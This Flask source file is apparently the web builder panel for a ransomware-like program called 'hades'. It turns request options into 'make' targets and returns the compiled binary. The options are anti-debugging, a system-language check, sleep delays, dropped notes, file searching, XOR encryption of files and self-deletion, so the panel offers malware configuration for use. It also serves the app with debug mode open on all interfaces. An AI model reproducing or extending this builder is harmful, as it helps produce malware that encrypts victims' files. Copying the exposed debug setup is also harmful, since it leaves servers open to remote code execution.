
from flask import render_template, Response, send_file
from flask import request
from flask import Flask

import subprocess
import base64

app = Flask(__name__)

class Options:

    _SEARCH_DIRECTORY = 0x0
    _SEARCH_RECURSIVELY = 0x1

    _ENCRYPT_NONE = 0x0
    _ENCRYPT_XOR = 0x1
    _ENCRYPT_AES = 0x2
    _ENCRYPT_RSA = 0x3

    SLEEP = None
    CHECK_DEBUG = None
    CHECK_LANGUAGE = None
    ADD_NOTES = None
    GET_FILES = None
    ENCRYPTION = None
    AUTODELETE = None

    def __init__(self, request_options: request) -> None:
        self.makecmd = ["make"]
        self.request_options = request_options

        self.SLEEP = request_options.get("sleep", None)
        self.CHECK_DEBUG = request_options.get("debug", None)
        self.CHECK_LANGUAGE = request_options.get("language", None)
        self.ADD_NOTES = request_options.get("notes", None)
        self.GET_FILES = int(request_options.get("get-files", Options._SEARCH_DIRECTORY))
        self.ENCRYPTION = int(request_options.get("encrypt-files", Options._ENCRYPT_NONE))
        self.AUTODELETE = request_options.get("auto-delete", None)
    
    def makeSleep(self) -> None:
        if self.SLEEP:
            self.makecmd.append("sleep")
        else:
            self.makecmd.append("nosleep")
    
    def makeDebug(self) -> None:
        if self.CHECK_DEBUG:
            self.makecmd.append("debug")
        else:
            self.makecmd.append("nodebug")
    
    def makeLanguage(self) -> None:
        if self.CHECK_LANGUAGE:
            self.makecmd.append("language")
        else:
            self.makecmd.append("nolanguage")
    
    def makeAddNotes(self) -> None:
        if self.ADD_NOTES:
            self.makecmd.append("note")
        else:
            self.makecmd.append("nonote")
    
    def makeGetFiles(self) -> None:
        return

    def makeEncryption(self) -> None:
        if self.ENCRYPTION == self._ENCRYPT_NONE:
            self.makecmd.append("noencrypt")
        elif self.ENCRYPTION == self._ENCRYPT_XOR:
            self.makecmd.append("xorencrypt")
        else:
            raise NotImplementedError
    
    def makeAutoDelete(self) -> None:
        if self.AUTODELETE:
            self.makecmd.append("autodelete")
        else:
            self.makecmd.append("noautodelete")
    
    def makeCompile(self) -> None:
        self.makecmd.append("compile")

    def generateMake(self) -> list:
        self.makeSleep()
        self.makeDebug()
        self.makeLanguage()
        self.makeAddNotes()
        self.makeGetFiles()
        self.makeEncryption()
        self.makeAutoDelete()
        self.makeCompile()

        return self.makecmd

@app.route("/")
def root():
    return render_template("index.html")

@app.route("/api/generate", methods=["POST"])
def api_generate():
    options = Options(request.json)

    makecmd = options.generateMake()

    import sys

    sys.stderr.write(" ".join(makecmd))
    sys.stderr.flush()

    process = subprocess.Popen(makecmd, stdout=subprocess.PIPE)
    status = process.wait()

    if not status:
        return send_file("hades")
    else:
        return Response(f"Error {status}: {process.stdout.readline()}", status=403)

if __name__ == "__main__":
    app.run(debug=True, port=80, host="0.0.0.0")
